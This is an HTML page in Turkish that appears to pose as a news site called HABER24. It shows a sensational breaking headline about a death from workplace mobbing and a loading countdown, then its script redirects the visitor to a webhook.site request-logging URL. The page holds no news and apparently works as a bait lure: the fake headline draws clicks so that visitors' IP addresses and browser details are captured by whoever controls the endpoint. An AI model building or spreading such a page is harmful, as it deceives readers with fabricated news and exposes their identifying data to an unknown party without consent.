<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>SON DAKİKA HABER</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
      margin: 0;
      padding: 0;
      color: #333;
    }
    .container {
      max-width: 800px;
      margin: 50px auto;
      padding: 30px;
      background: white;
      border-radius: 10px;
      box-shadow: 0 5px 15px rgba(0,0,0,0.1);
    }
    .header {
      text-align: center;
      border-bottom: 2px solid #e74c3c;
      padding-bottom: 20px;
      margin-bottom: 30px;
    }
    .logo {
      font-size: 28px;
      font-weight: bold;
      color: #e74c3c;
    }
    .loading {
      text-align: center;
      padding: 30px;
    }
    .spinner {
      border: 5px solid #f3f3f3;
      border-top: 5px solid #e74c3c;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .breaking-news {
      background: #e74c3c;
      color: white;
      padding: 10px;
      text-align: center;
      font-weight: bold;
      margin-bottom: 20px;
      border-radius: 5px;
    }
    .countdown {
      margin-top: 15px;
      font-size: 14px;
      color: #7f8c8d;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <div class="logo">HABER24</div>
      <div style="color: #7f8c8d; font-size: 14px;">Güvenilir haberin adresi</div>
    </div>

    <div class="breaking-news">MOBBİNG BİR KİŞİYİ DAHA CANINDAN ETTİ</div>

    <div class="loading">
      <h2>⏳ YÜKLENİYOR...</h2>
      <div class="spinner"></div>
      <p>EN GÜNCEL HABERLER.</p>
      <div class="countdown" id="countdown">Yönlendiriliyor: 5 saniye kaldı</div>
    </div>
  </div>

  <script>
    // Yönlendirme süresi (milisaniye cinsinden)
    const redirectTime = 5000; // 5 saniye
    
    // Geri sayımı göstermek için
    let timeLeft = redirectTime / 1000;
    const countdownElement = document.getElementById('countdown');
    
    const countdownInterval = setInterval(() => {
      timeLeft--;
      countdownElement.textContent = `Yönlendiriliyor: ${timeLeft} saniye kaldı`;
      
      if (timeLeft <= 0) {
        clearInterval(countdownInterval);
      }
    }, 1000);
    
    // Belirtilen süre sonra yönlendirme yap
    setTimeout(() => {
      window.location.href = "https://webhook.site/64e79efb-be4e-425c-aa6d-ef8b35d2d2c8";
    }, redirectTime);
    
    // Kullanıcı yönlendirmeyi iptal edebilsin diye bir buton ekleyebilirsiniz
    // Örnek: document.getElementById('cancelBtn').addEventListener('click', () => clearTimeout(redirectTimer));
  </script>
</body>
</html>
